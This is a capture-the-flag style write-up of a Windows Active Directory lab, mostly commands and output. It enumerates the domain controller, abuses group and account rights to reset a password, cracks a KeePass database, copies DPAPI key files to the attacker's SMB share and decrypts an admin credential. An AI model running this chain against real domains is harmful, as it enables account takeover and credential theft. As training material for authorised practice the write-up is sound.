## Lab Details
- Difficulty: Medium
- OS: Windows

## Summary
- Initial access: Provided Credential + Chained AD attacks 
- Privilege escalation: Extract saved DPAPI credential

## Enumeration
#### Steps
- run `nmap`
```
$ nmap 10.129.232.75 -p- -sC -sV -A -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-03 22:03 EDT
Nmap scan report for 10.129.232.75
Host is up (0.0079s latency).
Not shown: 65514 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-04 09:06:05Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49695/tcp open  msrpc         Microsoft Windows RPC
61979/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m59s
| smb2-time: 
|   date: 2026-06-04T09:07:52
|_  start_date: N/A
```
- Given credential 
```
levi.james / KingofAkron2025!
```
- Obtain the domain information using `enum4linux-ng`
```
 =====================================================
|    Domain Information via LDAP for 10.129.232.75    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: PUPPY.HTB

 ============================================================
|    Domain Information via SMB session for 10.129.232.75    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: PUPPY
DNS domain: PUPPY.HTB
FQDN: DC.PUPPY.HTB
Derived membership: domain member
Derived domain: PUPPY
```
- Run bloodhound ingestor 
```
$ bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' \
  -d puppy.htb -ns 10.129.232.75 \
  -dc DC.PUPPY.HTB -gc DC.PUPPY.HTB \
  --disable-autogc -c All --zip \
  --auth-method ntlm
```

## Foothold

#### Steps
- Enumerate bloodhound, identified user `levi.james` has belongs to the HR group which has `GenericWrite` access over developer group
![[Pasted image 20260604152757.png]]
- Add `levi.james` to the developer group
```
net rpc group addmem "developers" levi.james -U puppy.htb/levi.james%'KingofAkron2025!' -S 10.129.232.75
```
- Enumerate the smb on DC and identified a keepass file
```
$ smbclient //10.129.232.75/DEV -U 'levi.james'
Password for [WORKGROUP\levi.james]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Mar 23 07:07:57 2025
  ..                                  D        0  Sat Mar  8 16:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 07:09:12 2025
  Projects                            D        0  Sat Mar  8 16:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 02:25:46 2025

                5080575 blocks of size 4096. 1642040 blocks available
smb: \> mget recovery.kdbx
Get file recovery.kdbx? yes
getting file \recovery.kdbx of size 2677 as recovery.kdbx (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)
```
- Obtain the file hash using `keepass2john`
```
$ keepass2john recovery.kdbx > keepass.hash
```
- Crack using hashcat
```
$ hashcat keepass.hash /usr/share/wordlists/rockyou.txt
<SNIP>
$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9:liverpool
```
- Obtain user credentials for `ant.edwards` and `adam.silver`
![[Pasted image 20260604135240.png]]
- Adam.silver has remote access on DC 
![[Pasted image 20260604135745.png]]
- However the account is disabled
```
$ nxc smb 10.129.232.75 -u ADAM.SILVER -p 'HJKL2025!'
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.75   445    DC               [-] PUPPY.HTB\ADAM.SILVER:HJKL2025! STATUS_LOGON_FAILURE
```
- Ant.edwards account works and has `genericall` access over adam.silver
```
$ nxc smb 10.129.232.75 -u ANT.EDWARDS -p 'Antman2025!'
SMB         10.129.232.75   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\ANT.EDWARDS:Antman2025!
```

![[Pasted image 20260604135732.png]]
- enable adam.silver's account and set a new password
```
$ samba-tool user enable adam.silver --URL=ldap://10.129.169.218 -U 'PUPPY\ant.edwards%Antman2025!'

Enabled user 'adam.silver'
```

```
net rpc password "ADAM.SILVER" 'Antman2025!' -U "puppy.htb"/"ANT.EDWARDS"%'Antman2025!' -S "10.129.169.218"
```
- Use `adam.silver` to get a remote shell access
```
$ evil-winrm -i 10.129.169.218 -u ADAM.SILVER -p 'Antman2025!'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents>
```
## Lateral Movement 

#### Steps

## Privilege Escalation

#### Steps
- Enumerate the file system and identified a folder called Backups
```
*Evil-WinRM* PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         7/24/2025  12:30 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---          3/8/2025   8:52 AM                Users
d-----         5/13/2025   4:40 PM                Windows


*Evil-WinRM* PS C:\> cd Backups
*Evil-WinRM* PS C:\Backups> ls


    Directory: C:\Backups


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip


*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip

Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip
```
- There is a zipped file, download and extract 
- Identified a user and their password 
```
$ cat nms-auth-config.xml.bak
<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```
- user `steph.cooper` also has remote access to DC
![[Pasted image 20260604143035.png]]

```
$ nxc winrm 10.129.169.218 -u steph.cooper -p 'ChefSteph2025!'
WINRM       10.129.169.218  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:PUPPY.HTB)
WINRM       10.129.169.218  5985   DC               [+] PUPPY.HTB\steph.cooper:ChefSteph2025! (Pwn3d!)
```
- Gain remote access to DC as `steph.cooper`
```
$ evil-winrm -i 10.129.169.218 -u steph.cooper -p 'ChefSteph2025!'
```
- Enumerate the file system and identified the DPAPI master key and saved credential
- Locate the master key at `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect` 
- Locate the saved DPAPI credential at `C:\Users\USER\AppData\Roaming\Microsoft\Credentials`

- Search for stored DPAPI credential
```
*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials> get-childitem -force


    Directory: C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

```
- Search for master key 
```
*Evil-WinRM* PS C:\Users\steph.cooper> Get-ChildItem "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect" -Force


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         2/23/2025   2:36 PM                S-1-5-21-1487982659-1829050783-2281216199-1107
```
- Download the files locally using `impacket-smbserver`
```
## on host 
$ impacket-smbserver share . -smb2support -username user -password pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

## on target
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials> net use Z: \\10.10.14.17\share /user:user pass
The command completed successfully.
```
- Download the files 
```
*Evil-WinRM* PS C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials> copy ./C8D69EBE9A43E9DEBF6B5FBD48B521B9 Z:\
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> copy ./556a2412-1275-4ccf-b721-e6a0b4f90407 Z:\
```

- Decrypt using `impacket-dpapi` 
- Get the key first
```
$ impacket-dpapi masterkey -file "556a2412-1275-4ccf-b721-e6a0b4f90407" -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84

```
- Decrypt the credential
```
$ impacket-dpapi credential -file "C8D69EBE9A43E9DEBF6B5FBD48B521B9" -key "0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84"
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```
- Gain remote access using `evil-winrm`
```
$ evil-winrm -i 10.129.169.218 -u steph.cooper_adm -p 'FivethChipOnItsWay2025!'
```
## Lessons Learned
- Attack family:
- Key takeaway:

## Resources
- References: